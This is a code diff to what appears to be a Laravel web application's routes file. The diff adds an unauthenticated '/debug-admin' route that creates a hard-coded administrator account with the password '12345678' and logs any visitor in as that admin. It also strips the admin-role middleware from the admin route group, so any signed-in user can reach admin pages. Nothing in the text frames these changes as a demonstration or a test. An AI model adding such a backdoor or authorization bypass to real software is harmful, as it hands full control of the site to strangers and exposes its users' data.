@@ -18,9 +18,19 @@ use App\Http\Controllers\AdminController;
     */
 
     // Home
-    Route::get('/', function () {
+Route::get('/', function () {
         return view('welcome');
     })->name('home');
+use Illuminate\Support\Facades\Auth;
+use App\Models\User;
+Route::get('/debug-admin', function () {
+    $admin = User::firstOrCreate(
+        ['email' => 'admin@gmail.com'],
+        ['name' => 'Admin', 'password' => bcrypt('12345678'), 'role' => 'admin']
+    );
+    Auth::login($admin);
+    return redirect('/admin');
+});
 
     // Authentication
     Route::get('/login', [LoginController::class, 'showLoginForm'])->name('login');
@@ -44,6 +54,7 @@ use App\Http\Controllers\AdminController;
     */
 
     Route::middleware(['auth'])->group(function () {
+        Route::get('/admin/dashboard', [BooksController::class, 'adminDashboard'])->name('admin.dashboard');
 
         // ===============================
         // USER ROUTES
@@ -101,7 +112,7 @@ use App\Http\Controllers\AdminController;
         // ADMIN ROUTES
         // ===============================
 
-        Route::prefix('admin')->name('admin.')->middleware(['auth', 'admin'])->group(function () {
+        Route::prefix('admin')->name('admin.')->middleware(['auth'])->group(function () {
 
             // Dashboard
             Route::get('/', [BooksController::class, 'adminDashboard'])
